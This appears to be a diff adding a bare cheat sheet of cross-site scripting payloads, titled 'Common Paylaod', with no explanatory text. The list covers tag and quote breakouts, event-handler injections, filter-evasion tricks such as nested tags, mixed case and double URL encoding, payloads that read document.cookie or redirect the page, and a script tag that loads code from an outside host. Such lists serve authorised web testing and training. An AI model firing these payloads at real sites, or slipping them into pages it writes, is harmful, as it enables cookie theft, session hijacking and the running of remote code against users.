@@ -1,0 +1,46 @@
+Common Paylaod:
+
+<scriscriptpt>alert(10)</scriscriptpt>
+';alert("THM");//
+<svg onload=alert(1)>
+<img src=x onerror=alert(0)>
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+"></tag><svg onload=alert(1)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+"><svg onload=alert(1)>.gif
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<Svg OnLoad=alert(1)>
+<Script>alert(1)</Script>
+<svg onload=alert(1)//
+<svg onload="alert(1)"
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
+<script/x>alert(1)</script>
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#40;1&#41>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert("Hacked")>
+<img src=x onerror=alert(window.location="http://www.google.com")>
+"><img src=x onerror=alert(document.domain)>
+"><img src=x onerror=alert(document.cookie)>
+"><img src=x onerror=alert("Hacked")>
+"><img src=x onerror=alert(window.location="http://www.google.com")>
+><img src=x onerror=alert(document.domain)>
+><img src=x onerror=alert(document.cookie)>
+><img src=x onerror=alert("Hacked")>
+><img src=x onerror=alert(window.location="http://www.google.com")>
+"><scriptx>alert(1)</script>
+"><scriptx>alert(1)</script>//
+<scriptx>alert(1)</script>//
+<scriptx>alert(1)</script>
